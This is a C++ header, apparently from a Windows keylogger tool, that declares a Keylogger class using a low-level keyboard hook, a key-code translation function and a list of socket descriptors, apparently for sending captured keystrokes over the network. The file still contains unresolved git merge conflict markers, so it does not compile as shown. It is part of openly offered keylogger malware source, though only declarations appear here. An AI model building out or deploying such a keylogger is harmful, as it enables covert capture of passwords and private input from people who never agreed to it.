#pragma once
#include <WinSock2.h>
#include <thread>
#include <future>
#include <windows.h>
<<<<<<< HEAD
#include <set>
=======
#include <vector>
>>>>>>> 86a984b35be3c9a1c3b1f77e1ee399baa4436cdf

class Keylogger {
    std::thread _t;
    std::promise<void> _p;
    HHOOK _hHook;
<<<<<<< HEAD
=======
    std::vector<int> keylogfds;
>>>>>>> 86a984b35be3c9a1c3b1f77e1ee399baa4436cdf

    void keylogFunc(std::future<void> future);
public:
    Keylogger();
    ~Keylogger();
};

<<<<<<< HEAD
extern std::set<int> keylogfds;
=======
extern std::vector<int> keylogfds;
>>>>>>> 86a984b35be3c9a1c3b1f77e1ee399baa4436cdf
std::pair <std::string, bool> changeToKeyPress(DWORD dwKeyCode); // get key press from DWORD
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);

